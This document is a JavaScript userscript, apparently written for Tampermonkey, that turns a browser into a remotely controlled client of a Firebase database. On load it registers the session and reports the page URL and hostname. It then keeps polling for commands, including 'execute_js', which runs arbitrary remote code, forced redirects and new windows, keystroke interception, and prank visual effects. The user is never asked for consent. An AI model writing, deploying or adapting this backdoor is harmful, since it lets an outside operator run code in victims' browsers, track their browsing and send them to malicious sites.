(function () {
  'use strict';

  // ─── CONFIG ───────────────────────────────────────────────────────────────────
  const FB_ADMIN       = "https://tampermonkey-ab279-default-rtdb.europe-west1.firebasedatabase.app";
  const CMD_POLL_MS    = 10000;  // was 3000
  const HEARTBEAT_MS   = 60000;  // was 15000
  const CMD_MAX_AGE_MS = 600000;

  // ─── SESSION ──────────────────────────────────────────────────────────────────
  let SESSION_ID = localStorage.getItem("_adm_sid");
  if (!SESSION_ID) {
    SESSION_ID = "s_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
    localStorage.setItem("_adm_sid", SESSION_ID);
  }

  const USER = localStorage.getItem("_adm_user") || "guest_" + SESSION_ID.slice(2, 8);

  // ─── STATE ────────────────────────────────────────────────────────────────────
  let cmdTimer = null;
  let hbTimer  = null;
  const executedCmds = new Set();

  // ─── REQUEST ──────────────────────────────────────────────────────────────────
  function req(method, url, data, cb) {
    fetch(url, {
      method,
      headers: { "Content-Type": "application/json" },
      body: data !== undefined && data !== null ? JSON.stringify(data) : undefined
    })
      .then(r => r.json().then(d => cb && cb(200, d)).catch(() => cb && cb(200, null)))
      .catch(() => cb && cb(0, null));
  }

  // ─── REGISTER SESSION ─────────────────────────────────────────────────────────
  function registerSession() {
    req("PATCH", FB_ADMIN + "/sessions/" + SESSION_ID + ".json", {
      username: USER,
      status:   "active",
      joinedAt: Date.now(),
      lastSeen: Date.now(),
      url:      location.href.slice(0, 120),
      hostname: location.hostname
    });
  }

  // ─── HEARTBEAT ────────────────────────────────────────────────────────────────
  function heartbeat() {
    req("PATCH", FB_ADMIN + "/sessions/" + SESSION_ID + ".json", {
      status:   "active",
      lastSeen: Date.now()
    });
  }

  function startHeartbeat() {
    if (hbTimer) clearInterval(hbTimer);
    hbTimer = setInterval(heartbeat, HEARTBEAT_MS);
  }

  // ─── COMMAND POLL ─────────────────────────────────────────────────────────────
  function startCmdPoll() {
    if (cmdTimer) clearInterval(cmdTimer);
    pollAdminCommands();
    cmdTimer = setInterval(pollAdminCommands, CMD_POLL_MS);
  }

  function pollAdminCommands() {
    req("GET", FB_ADMIN + "/commands.json", null, (status, cmds) => {
      if (status !== 200 || !cmds || typeof cmds !== "object" || cmds.error) return;
      const now = Date.now();
      Object.entries(cmds).forEach(([cid, cmd]) => {
        if (!cmd || typeof cmd !== "object") return;
        if (now - (cmd.ts || 0) > CMD_MAX_AGE_MS) return;
        if (executedCmds.has(cid)) return;
        const t = cmd.target;
        if (t && t !== "all" && t !== USER && t !== SESSION_ID && t !== location.hostname) return;
        executedCmds.add(cid);
        req("PATCH", FB_ADMIN + "/commands/" + cid + "/executed.json", { [SESSION_ID]: true });
        execAdminCommand(cmd);
      });
    });
  }

  // ─── COMMAND EXECUTOR ─────────────────────────────────────────────────────────
  function execAdminCommand(cmd) {
    switch (cmd.type) {

      case "broadcast": {
        if (!document.getElementById("__adm_style")) {
          const s = document.createElement("style"); s.id = "__adm_style";
          s.textContent = `@keyframes admPop{from{opacity:0;transform:translateX(-50%) translateY(8px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}@keyframes admShake{0%,100%{transform:translate(0)}15%{transform:translate(-8px,2px)}30%{transform:translate(6px,-2px)}45%{transform:translate(-5px,1px)}60%{transform:translate(4px,-1px)}75%{transform:translate(-3px,1px)}90%{transform:translate(2px,0)}}`;
          document.head.appendChild(s);
        }
        const d = document.createElement("div");
        Object.assign(d.style, {
          position:"fixed",bottom:"20px",left:"50%",transform:"translateX(-50%)",
          padding:"10px 18px",borderRadius:"5px",fontFamily:"monospace",fontSize:"12px",
          fontWeight:"700",zIndex:"999999999",pointerEvents:"none",
          background:cmd.color||"#1a1a2e",color:"#fff",
          border:"1px solid rgba(255,255,255,0.15)",maxWidth:"360px",textAlign:"center",
          animation:"admPop .25s ease"
        });
        d.textContent = cmd.message || "Admin message";
        document.body.appendChild(d);
        setTimeout(() => { d.style.opacity="0"; d.style.transition="opacity .3s"; setTimeout(()=>d.remove(),320); }, cmd.duration||4000);
        break;
      }

      case "screen_shake":
        document.body.style.animation = "none";
        requestAnimationFrame(() => { document.body.style.animation = "admShake .65s ease"; setTimeout(()=>{document.body.style.animation="";},700); });
        break;

      case "invert":
        document.body.style.filter = document.body.style.filter === "invert(1)" ? "" : "invert(1)";
        break;

      case "flip":
        document.body.style.transform = document.body.style.transform === "rotate(180deg)" ? "" : "rotate(180deg)";
        break;

      case "snow":     toggleSnow();     break;
      case "matrix":   toggleMatrix();   break;
      case "confetti": launchConfetti(); break;

      case "slow_input":
        window.__admSlowInput = !window.__admSlowInput;
        window.__admSlowInput
          ? document.addEventListener("keydown", slowInputHandler, { capture:true })
          : document.removeEventListener("keydown", slowInputHandler, { capture:true });
        break;

      case "big_cursor": {
        const ex = document.getElementById("__adm_bigcur");
        if (ex) { ex.remove(); break; }
        const s = document.createElement("style"); s.id = "__adm_bigcur";
        s.textContent = `*{cursor:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"><text y="52" font-size="52">👆</text></svg>') 0 0,auto!important;}`;
        document.head.appendChild(s);
        break;
      }

      case "reload":   setTimeout(()=>location.reload(), 600); break;
      case "redirect": if (cmd.url) setTimeout(()=>{location.href=cmd.url;},300); break;
      case "open_site":if (cmd.url) window.open(cmd.url,"_blank"); break;

      case "ping":
        req("PATCH", FB_ADMIN+"/sessions/"+SESSION_ID+".json", { lastSeen:Date.now(), status:"active", lastPong:Date.now() });
        break;

      case "execute_js":
        if (cmd.code) { try { (new Function(cmd.code))(); } catch(e) { console.error("[admin] js err:",e); } }
        break;

      case "ghost_message":
        if (cmd.text) {
          const el = document.createElement("div");
          Object.assign(el.style, {
            position:"fixed",bottom:"70px",right:"20px",background:"rgba(59,130,246,.1)",
            border:"1px solid rgba(59,130,246,.25)",borderRadius:"4px",padding:"10px 14px",
            fontSize:"12px",color:"#60a5fa",fontFamily:"monospace",zIndex:"999999990",maxWidth:"280px",wordBreak:"break-word"
          });
          el.innerHTML = "📢 <b>Admin:</b> " + cmd.text.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
          document.body.appendChild(el);
          setTimeout(()=>el.remove(), cmd.duration||8000);
        }
        break;

      case "disable":
        clearInterval(cmdTimer); clearInterval(hbTimer);
        req("PATCH", FB_ADMIN+"/sessions/"+SESSION_ID+".json", { status:"disabled", lastSeen:Date.now() });
        break;

      case "enable":
        registerSession(); startHeartbeat(); startCmdPoll();
        break;
    }
  }

  // ─── SLOW INPUT ───────────────────────────────────────────────────────────────
  function slowInputHandler(e) {
    if (e.key.length !== 1 || e.ctrlKey || e.altKey || e.metaKey) return;
    e.preventDefault();
    const el = e.target, s = el.selectionStart, en = el.selectionEnd, ch = e.key;
    setTimeout(() => { el.value = el.value.slice(0,s)+ch+el.value.slice(en); el.selectionStart=el.selectionEnd=s+1; }, 900);
  }

  // ─── EFFECTS ──────────────────────────────────────────────────────────────────
  function toggleSnow() {
    const ex = document.getElementById("__adm_snow"); if (ex) { ex.remove(); return; }
    const c = document.createElement("canvas"); c.id = "__adm_snow";
    Object.assign(c.style,{position:"fixed",inset:"0",pointerEvents:"none",zIndex:"999999990"});
    c.width=innerWidth; c.height=innerHeight; document.body.appendChild(c);
    const ctx=c.getContext("2d");
    const fl=Array.from({length:90},()=>({x:Math.random()*c.width,y:Math.random()*c.height,r:Math.random()*3+2,s:Math.random()*1.5+0.5}));
    (function draw(){
      if(!document.getElementById("__adm_snow"))return;
      ctx.clearRect(0,0,c.width,c.height); ctx.fillStyle="rgba(220,230,255,.8)";
      fl.forEach(f=>{ctx.beginPath();ctx.arc(f.x,f.y,f.r,0,Math.PI*2);ctx.fill();f.y+=f.s;if(f.y>c.height){f.y=0;f.x=Math.random()*c.width;}});
      requestAnimationFrame(draw);
    })();
  }

  function toggleMatrix() {
    const ex = document.getElementById("__adm_matrix"); if (ex) { ex.remove(); return; }
    const c = document.createElement("canvas"); c.id="__adm_matrix";
    Object.assign(c.style,{position:"fixed",inset:"0",pointerEvents:"none",zIndex:"999999991",opacity:".88"});
    c.width=innerWidth; c.height=innerHeight; document.body.appendChild(c);
    const ctx=c.getContext("2d"), cols=Math.floor(c.width/14), drops=new Array(cols).fill(0);
    (function draw(){
      if(!document.getElementById("__adm_matrix"))return;
      ctx.fillStyle="rgba(0,0,0,.055)";ctx.fillRect(0,0,c.width,c.height);
      ctx.fillStyle="#00dd55";ctx.font="13px monospace";
      drops.forEach((y,i)=>{ctx.fillText(String.fromCharCode(0x30a0+Math.random()*96),i*14,y*14);drops[i]=(y>c.height/14&&Math.random()>.975)?0:y+1;});
      requestAnimationFrame(draw);
    })();
  }

  function launchConfetti() {
    for(let i=0;i<80;i++){
      const d=document.createElement("div");
      Object.assign(d.style,{position:"fixed",top:"-12px",left:Math.random()*100+"vw",width:"9px",height:"9px",background:`hsl(${Math.random()*360},90%,60%)`,borderRadius:Math.random()>.5?"50%":"2px",zIndex:"999999992",transition:`top ${1+Math.random()*2}s ease,opacity .8s`,pointerEvents:"none"});
      document.body.appendChild(d);
      requestAnimationFrame(()=>{d.style.top="110vh";});
      setTimeout(()=>{d.style.opacity="0";setTimeout(()=>d.remove(),900);},200+Math.random()*1800);
    }
  }

  // ─── INIT ─────────────────────────────────────────────────────────────────────
  registerSession();
  startHeartbeat();
  startCmdPoll();

})();
